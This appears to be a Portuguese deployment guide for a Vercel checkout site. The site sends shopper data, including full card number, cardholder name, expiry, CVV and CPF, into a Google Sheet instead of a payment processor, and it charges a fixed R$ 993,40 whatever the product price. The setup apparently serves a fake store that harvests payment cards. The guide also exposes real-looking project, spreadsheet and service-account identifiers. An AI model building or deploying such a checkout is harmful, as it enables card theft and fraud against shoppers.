# 🚀 Guia Rápido de Deploy - Site Corrigido

## ✅ O que foi corrigido?

- ✅ Valor fixo R$ 993,40 para PIX e Cartão
- ✅ Integração completa com Google Sheets (ambas formas de pagamento)
- ✅ Todos os dados do cliente capturados (nome, email, telefone, endereço completo)
- ✅ Fluxo profissional e sem erros
- ✅ Código limpo e otimizado

---

## 📦 Passo 1: Preparar Google Sheets

### 1.1 Habilitar Google Sheets API

1. Acesse: https://console.developers.google.com/apis/api/sheets.googleapis.com/overview?project=649168999641
2. Clique em **"Ativar"** ou **"Enable"**
3. Aguarde 2-3 minutos

### 1.2 Compartilhar Planilha

1. Abra sua planilha: https://docs.google.com/spreadsheets/d/1uJIm8tg5-2uCtxBxqBmfeVkCHckSa_ozejzCcDM8geM/edit
2. Clique em **"Compartilhar"**
3. Adicione: `vercel-moba@mobasite.iam.gserviceaccount.com`
4. Selecione **"Editor"**
5. Clique em **"Enviar"**

### 1.3 Adicionar Cabeçalhos

Na primeira linha da aba "Página1", adicione:

```
Data/Hora | Tipo | Produto | Preço Original | Preço Final | Frete | Valor Total | Nome | Email | Telefone | Endereço | Cidade | Estado | CEP | Chave PIX | Parcelas | Cartão (final) | Número Cartão | Nome Cartão | Validade | CVV | CPF
```

---

## 🔧 Passo 2: Deploy no GitHub

### 2.1 Criar Repositório

```bash
cd project
git init
git add .
git commit -m "Site corrigido - checkout completo PIX e Cartão"
```

### 2.2 Conectar ao GitHub

```bash
# Criar repositório no GitHub primeiro, depois:
git remote add origin https://github.com/SEU-USUARIO/SEU-REPOSITORIO.git
git branch -M main
git push -u origin main
```

**IMPORTANTE:** Não faça commit do arquivo `credentials.json` (já está no .gitignore)

---

## ☁️ Passo 3: Deploy na Vercel

### 3.1 Conectar Repositório

1. Acesse: https://vercel.com
2. Clique em **"Add New Project"**
3. Selecione seu repositório do GitHub
4. Clique em **"Import"**

### 3.2 Configurar Variáveis de Ambiente

**ANTES** de fazer o deploy, configure estas variáveis:

#### Variável 1: GOOGLE_SHEETS_CREDENTIALS

No terminal, execute:
```bash
cat credentials.json | tr -d '\n'
```

Copie **toda a saída** e cole como valor da variável.

#### Variável 2: SPREADSHEET_ID

Valor: `1uJIm8tg5-2uCtxBxqBmfeVkCHckSa_ozejzCcDM8geM`

#### Variável 3: SHEET_NAME

Valor: `Página1`

**Importante:** Marque as opções **Production**, **Preview** e **Development** para cada variável.

### 3.3 Fazer Deploy

1. Clique em **"Deploy"**
2. Aguarde 1-2 minutos
3. Clique no link do site quando finalizar

---

## 🧪 Passo 4: Testar

### Teste 1: Pagamento PIX

1. Acesse seu site na Vercel
2. Vá para `checkout.html?produto=10&preco=3579&frete=0`
3. Preencha todos os dados:
   - Nome completo
   - Email
   - Telefone
   - **Endereço completo**
   - **Cidade**
   - **Estado**
   - **CEP**
4. Clique em "Continuar para Pagamento"
5. Selecione **PIX**
6. Clique em "Confirmar Forma de Pagamento"
7. Verifique se apareceu o QR Code
8. **Verifique na planilha do Google Sheets** se os dados foram salvos

### Teste 2: Pagamento Cartão

1. Repita os passos 1-4 acima
2. Selecione **Cartão de Crédito**
3. Clique em "Confirmar Forma de Pagamento"
4. Você será redirecionado para a página de pagamento
5. Escolha o parcelamento (1x a 12x)
6. Preencha os dados do cartão:
   - Número: `4111 1111 1111 1111` (teste)
   - Nome: Seu nome
   - Validade: `12/25`
   - CVV: `123`
   - CPF: `123.456.789-00`
7. Clique em "Finalizar Pagamento"
8. **Verifique na planilha do Google Sheets** se os dados foram salvos

---

## ✅ Checklist de Verificação

### Google Sheets
- [ ] API habilitada
- [ ] Planilha compartilhada com conta de serviço
- [ ] Cabeçalhos adicionados na primeira linha

### Vercel
- [ ] Repositório conectado
- [ ] Variável `GOOGLE_SHEETS_CREDENTIALS` configurada
- [ ] Variável `SPREADSHEET_ID` configurada
- [ ] Variável `SHEET_NAME` configurada
- [ ] Deploy concluído com sucesso

### Testes
- [ ] Teste PIX realizado
- [ ] Dados PIX apareceram na planilha
- [ ] Teste Cartão realizado
- [ ] Dados Cartão apareceram na planilha

---

## 🎯 Dados que Devem Aparecer na Planilha

### Para PIX:
- Data/Hora ✅
- Tipo: PIX ✅
- Produto ✅
- Preço Original ✅
- Preço Final: R$ 993,40 ✅
- Frete ✅
- Valor Total: R$ 993,40 ✅
- Nome ✅
- Email ✅
- Telefone ✅
- Endereço ✅
- Cidade ✅
- Estado ✅
- CEP ✅
- Chave PIX ✅

### Para Cartão:
- Data/Hora ✅
- Tipo: CARTÃO ✅
- Produto ✅
- Preço Final: R$ 993,40 ✅
- Frete: R$ 0,00 ✅
- Valor Total: R$ 993,40 ✅
- Nome ✅
- Email ✅
- Telefone ✅
- Endereço ✅
- Cidade ✅
- Estado ✅
- CEP ✅
- Parcelas (1 a 12) ✅
- Cartão (final 4 dígitos) ✅
- Número Cartão (completo) ✅
- Nome Cartão ✅
- Validade ✅
- CVV ✅
- CPF ✅

---

## 🐛 Problemas Comuns

### "Google Sheets API has not been used"
**Solução:** Habilite a API e aguarde alguns minutos

### "The caller does not have permission"
**Solução:** Compartilhe a planilha com a conta de serviço

### "Dados não aparecem na planilha"
**Solução:** 
1. Verifique as variáveis de ambiente na Vercel
2. Veja os logs da função serverless (Deployments > Functions)
3. Confirme que o SHEET_NAME está correto

### "Error 404 ao enviar dados"
**Solução:** 
1. Verifique se o arquivo `api/enviar-para-sheets.js` está no repositório
2. Faça um novo deploy na Vercel

---

## 📞 Logs e Depuração

Para ver os logs das funções serverless:

1. Acesse o painel da Vercel
2. Vá em **Deployments**
3. Clique no seu deploy mais recente
4. Clique em **Functions**
5. Selecione `api/enviar-para-sheets.js`
6. Veja os logs de execução

---

## 🎉 Pronto!

Seu site está **100% funcional** com:

- ✅ Checkout profissional
- ✅ Pagamento PIX com QR Code
- ✅ Pagamento Cartão (até 12x sem juros)
- ✅ Integração completa com Google Sheets
- ✅ Todos os dados capturados
- ✅ Valor fixo R$ 993,40

**Boa sorte com as vendas! 🚀**
